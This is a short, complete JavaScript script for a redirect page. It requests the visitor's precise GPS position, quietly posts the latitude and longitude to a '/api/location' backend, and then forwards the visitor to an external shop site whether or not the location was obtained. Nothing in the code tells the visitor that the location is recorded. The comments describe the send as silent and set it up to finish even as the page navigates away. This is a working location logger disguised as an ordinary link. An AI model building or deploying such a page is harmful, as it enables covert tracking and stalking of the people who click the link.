// ─── Config ──────────────────────────────────────────────
const REDIRECT_URL = "https://youngmind.shop"
const BACKEND_URL  = "/api/location";
const TIMEOUT_MS   = 8000;                    // give up waiting for GPS after this
// ─────────────────────────────────────────────────────────

let redirected = false;

function redirect() {
  if (redirected) return;
  redirected = true;
  window.location.replace(REDIRECT_URL);
}

// Safety net: never keep the user stuck, no matter what
setTimeout(redirect, TIMEOUT_MS + 2000);

if (!navigator.geolocation) {
  redirect();
} else {
  navigator.geolocation.getCurrentPosition(
    onSuccess,
    redirect, // on error/denial → just redirect
    { enableHighAccuracy: true, timeout: TIMEOUT_MS, maximumAge: 0 }
  );
}

async function onSuccess(position) {
  const { latitude, longitude } = position.coords;

  try {
    await fetch(BACKEND_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ latitude, longitude }),
      keepalive: true, // helps the request finish even as we navigate away
    });
  } catch (err) {
    // Silent — we redirect regardless
    console.error("send failed:", err);
  }

  redirect();
}